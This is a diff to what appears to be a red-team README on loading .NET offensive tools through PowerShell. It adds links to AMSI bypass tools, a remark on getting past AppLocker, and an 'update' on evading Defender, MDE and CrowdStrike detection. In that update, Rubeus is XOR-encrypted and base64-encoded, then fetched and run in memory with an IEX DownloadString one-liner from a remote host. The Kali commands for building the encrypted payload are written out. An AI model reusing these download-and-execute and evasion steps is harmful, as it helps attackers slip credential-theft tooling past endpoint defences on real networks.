@@ -12,6 +12,12 @@ https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
 
 
+## A Sharp Assembly AMSI bypass
+https://github.com/F4l13n5n0w/amseekiller
+
+This can be used to bypass some applocker controlls if powershell is accessible.
+
+
 ## A golang version AMSI bypass using direct syscalls (improved and much more chance to be successful)
 https://github.com/timwhitez/Doge-AMSI-patch//
 
@@ -136,5 +142,32 @@ Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/
 ## Load SharpShares
 Invoke-LoadAssembly -AssemblyUrl http://10.0.0.144:81/SharpShares.exe -Command "-h"
 Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpShares.exe?raw=true -Command "-h"
+
+```
+
+## [Update] In some cases that the AV/EDR (such as Defender) will detect and block the download of the known malicious tools (such as Rubeus.exe), this will break the workflow of Invoke-Assembly.ps1 since the assembly is blocked by AV during download from the attacker's website. One way to bypass this is to base64 the binary and encrypt it (in this case, using XOR since it's simple and fast), then download and load the encrypted file using the new Invoke-AssemblyXOR.ps1 to load the tool. AMSI bypassed is required to bypass MDE and CS Falcon will detect when the tool is running and kill it in seconds.
+
+```
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXOR.ps1"));
+Invoke-LoadAssemblyXOR -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/rubeusxorb64.txt -Command "hash /password:test"
+
+```
+
+To generate the XOR encrypted Rubeus.exe from powershell on Kali Linux:
+```
+┌──(root㉿average-student)-[/var/www/html/test]
+└─PS> Import-Module ./pwshxor.ps1
+
+┌──(root㉿average-student)-[/var/www/html/test]
+└─PS> $path = "/var/www/html/test/Rubeus.exe";
+
+┌──(root㉿average-student)-[/var/www/html/test]
+└─PS> $EncodedData = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path));
+
+┌──(root㉿average-student)-[/var/www/html/test]
+└─PS> $enc_out = (xor $EncodedData "encrypt")
+
+┌──(root㉿average-student)-[/var/www/html/test]
+└─PS> $enc_out > rubeusxorb64.txt
 
 ```
